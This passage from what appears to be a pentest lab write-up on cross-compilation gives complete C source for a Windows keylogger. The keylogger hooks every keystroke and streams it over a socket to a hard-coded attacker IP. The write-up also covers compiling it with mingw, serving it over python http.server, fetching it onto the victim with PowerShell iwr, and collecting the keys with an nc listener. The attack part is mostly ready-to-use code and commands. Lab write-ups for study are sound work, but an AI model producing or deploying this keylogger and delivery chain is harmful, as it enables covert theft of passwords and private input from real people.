- After on `Terminal` -> Press `Ctrl + C` to stop it:
<img width="416" height="90" alt="image" src="https://github.com/user-attachments/assets/9b3e3be3-4d2a-48e5-bf1a-fe76a4b999f1" />

- After check our key:
````
dir
````
<img width="1296" height="616" alt="image" src="https://github.com/user-attachments/assets/ad5bb38f-5b1d-4993-8116-7ee69cdaae43" />

- Now we get successful to get target keystroke.


---




## 7. Advance keylogger:

### Create file
````
mousepad keyloggers.c
````
````
// keyloggers.c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

// CONFIG: CHANGE THESE TO YOUR KALI IP AND PORT
#define KALI_IP "192.168.127.128"
#define KALI_PORT "4444"

SOCKET sock = INVALID_SOCKET;

void send_key(const char* key) {
    if (sock == INVALID_SOCKET) return;
    send(sock, key, (int)strlen(key), 0);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = p->vkCode;

        if (vk == VK_RETURN) send_key("\n");
        else if (vk == VK_SPACE) send_key(" ");
        else if (vk == VK_BACK) send_key("[BACK]");
        else if (vk == VK_TAB) send_key("[TAB]");
        else if (vk == VK_SHIFT || vk == VK_CONTROL || vk == VK_MENU) {
            // Skip
        }
        else {
            BYTE keys[256];
            GetKeyboardState(keys);
            WORD char_code;
            ToAscii(vk, p->scanCode, keys, &char_code, 0);
            char c = (char)char_code;
            if (c >= 32 && c <= 126) {
                char buf[2] = {c, 0};
                send_key(buf);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    // Connect to Kali
    struct addrinfo hints = {0}, *res;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(KALI_IP, KALI_PORT, &hints, &res) != 0) return 1;

    sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock == INVALID_SOCKET) return 1;

    if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
        closesocket(sock);
        return 1;
    }
    freeaddrinfo(res);

    // Install hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!hook) {
        closesocket(sock);
        return 1;
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    UnhookWindowsHookEx(hook);
    closesocket(sock);
    WSACleanup();
    return 0;
}
````
<img width="793" height="744" alt="image" src="https://github.com/user-attachments/assets/6eaef158-f39d-4ae3-a4bb-5395756931ef" />

````
x86_64-w64-mingw32-gcc keyloggers.c -o keyloggers.exe -static -lws2_32
````
<img width="645" height="183" alt="image" src="https://github.com/user-attachments/assets/b5fdbabe-6cd9-4365-8f95-aaebb264f020" />


### Transfer to target:

#### On attacker:
````
python3 -m http.server 4444
````
<img width="526" height="133" alt="image" src="https://github.com/user-attachments/assets/d3d6c6bb-0f1b-4baa-8299-64122b9d5de5" />


#### On victim
````
iwr -uri "http://192.168.127.128:4444/keyloggers.exe" -OutFile keyloggers.exe
````
<img width="1183" height="310" alt="image" src="https://github.com/user-attachments/assets/4b3d6db1-ca35-4e16-b871-ca5ecae0c67f" />


### Start Listening 
````
nc -lvnp 4444
````
<img width="283" height="144" alt="image" src="https://github.com/user-attachments/assets/d7b3f05a-c331-4692-91ca-61b158e0e68d" />


- After back to target:
````
./keyloggers.exe
````
<img width="550" height="176" alt="image" src="https://github.com/user-attachments/assets/006de99d-eaee-415b-81eb-92f5b0bb9412" />

- After I open `Notepad` and type anything:
<img width="1024" height="600" alt="image" src="https://github.com/user-attachments/assets/ecff13d8-dafe-4d52-84c7-0158c93d1e32" />

<img width="1024" height="470" alt="image" src="https://github.com/user-attachments/assets/15b52b34-3e89-44ff-92c1-5934d207344a" />

- After back to attacker:
<img width="700" height="288" alt="image" src="https://github.com/user-attachments/assets/226ec245-f601-4310-8472-231c04b3a58d" />

<img width="1024" height="400" alt="image" src="https://github.com/user-attachments/assets/b0d8cc1b-830c-41b1-acaa-7fa7e7db011f" />

<img width="1024" height="370" alt="image" src="https://github.com/user-attachments/assets/1d60fa53-a4a0-4088-adc2-d8d4e502fda8" />

- Now we got successful to get target keystroke.



---


<h1 align="center"> Completed - Cross Compilation </h1>


<h2 align="center"> 
  &copy; 2026 Nin Kanong (<a href="https://github.com/Nin-Kanong/pentest-writeups">@k4n0ng</a>). All rights reserved.
</h2>
